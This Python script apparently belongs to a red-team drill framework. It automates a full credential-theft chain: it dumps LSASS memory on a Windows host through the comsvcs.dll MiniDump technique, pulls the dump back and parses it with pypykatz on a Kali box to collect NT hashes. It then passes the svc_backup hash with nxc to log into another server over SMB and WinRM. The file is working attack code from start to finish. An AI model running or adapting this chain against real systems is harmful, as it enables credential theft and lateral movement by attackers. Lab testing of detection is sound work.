"""GP-1 full chain: dump LSASS on RAC (over the WinRM channel, since SMB is firewalled), pull the
dump, hand it to Kali's pypykatz, recover np\\svc_backup's NT hash, and pass-the-hash into NMS.
Proves "Red extracts an admin hash on RAC and logs into NMS with it". Cleans up the dump both ends.
NT hashes are masked in printed output. usage: python -I extract_and_pth.py <backend>"""
import asyncio, re, sys
from pathlib import Path

BACKEND = Path(sys.argv[1]).resolve()
sys.path.insert(0, str(BACKEND))
import asyncssh  # noqa: E402
from app.config import Settings  # noqa: E402
from app.core.audit import AuditLog  # noqa: E402
from app.core.credentials import CredentialStore  # noqa: E402
from app.core.pool import SessionPool  # noqa: E402
from app.models.inventory import Inventory  # noqa: E402
from app.transports import psfiles  # noqa: E402

KALI, KPIN = "10.5.20.50", "SHA256:usPlqQ8/75/E6iXqsKrwmAzk7/69fUsC7X2+eecHoAA"
NMS = "192.168.30.11"
DUMP_REMOTE = r"C:\Windows\Temp\lb.dmp"


def mask(h: str) -> str:
    return h[:4] + "…" + h[-4:] if len(h) > 8 else "…"


async def main() -> None:
    settings = Settings.load()
    inv = Inventory.load(settings.inventory_path)
    creds = CredentialStore.load(BACKEND.parent / "config" / "credentials.example.yaml")
    audit = AuditLog(settings.audit_abs)
    pool = SessionPool(settings=settings, inventory=inv, creds=creds)
    rac = next(t for t in inv.all() if t.name == "L4H1_RAC")
    tr = await pool._open_shell(rac)

    # 1) dump lsass via the native comsvcs MiniDump (local admin has SeDebugPrivilege)
    dump_ps = r"""
$ErrorActionPreference='Stop'
$lp = (Get-Process lsass).Id
cmd /c "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lp C:\Windows\Temp\lb.dmp full" 2>&1 | Out-Null
if (Test-Path C:\Windows\Temp\lb.dmp) { 'DUMP OK size=' + (Get-Item C:\Windows\Temp\lb.dmp).Length } else { 'DUMP FAILED' }
"""
    r = await tr.run(dump_ps, timeout=120)
    print("[RAC] " + (r.stdout or r.stderr).strip())
    if "DUMP OK" not in (r.stdout or ""):
        print("Credential-dump was blocked or failed on RAC (likely AV). Stopping.")
        return
    audit.record(action="drill.lsass-dump", target="L4H1_RAC", transport=str(tr.name), result="ok")

    # 2) pull the dump over the channel, then remove it from RAC (always clean up)
    print("[*] pulling dump over WinRM channel (slow path)…")
    try:
        data = await psfiles.read_bytes(tr.run, DUMP_REMOTE)
        print(f"[*] pulled {len(data)} bytes")
    finally:
        await tr.run(f"Remove-Item -LiteralPath '{DUMP_REMOTE}' -Force -ErrorAction SilentlyContinue", timeout=30)

    # 3) stream to Kali, parse with pypykatz
    async with asyncssh.connect(KALI, username="kali", password="kali", known_hosts=None) as c:
        import hashlib, base64
        k = c.get_server_host_key()
        assert "SHA256:" + base64.b64encode(hashlib.sha256(k.public_data).digest()).decode().rstrip("=") == KPIN
        await c.run("cat > /tmp/lb.dmp", input=data)
        pk = await c.run("pypykatz lsa minidump /tmp/lb.dmp 2>/dev/null", check=False)
        text = pk.stdout or ""
        # find username -> NT pairs
        creds_found = {}
        cur = None
        for line in text.splitlines():
            m = re.search(r"Username:\s*(\S+)", line)
            if m:
                cur = m.group(1)
            m = re.search(r"\bNT:\s*([0-9a-fA-F]{32})\b", line)
            if m and cur:
                creds_found[cur] = m.group(1)
        print("[Kali] pypykatz recovered NT hashes for:",
              ", ".join(f"{u}={mask(h)}" for u, h in creds_found.items()) or "(none)")
        nt = creds_found.get("svc_backup")
        if not nt:
            print("svc_backup NT hash not found in the dump. (Is the LabBackupAgent task running?)")
            await c.run("rm -f /tmp/lb.dmp")
            return
        audit.record(action="drill.cred-extract", target="L4H1_RAC", transport="pypykatz", result="ok")

        # 4) pass-the-hash into NMS as the recovered svc_backup
        for proto in ("smb", "winrm"):
            res = await c.run(f"nxc {proto} {NMS} -u svc_backup -H {nt} -d np.local --no-progress", check=False)
            out = ((res.stdout or "") + (res.stderr or "")).replace(nt, "<NTHASH>").strip()
            print(f"\n===== nxc {proto} {NMS} (PtH as recovered svc_backup) =====\n{out}")
        await c.run("rm -f /tmp/lb.dmp")


asyncio.run(main())
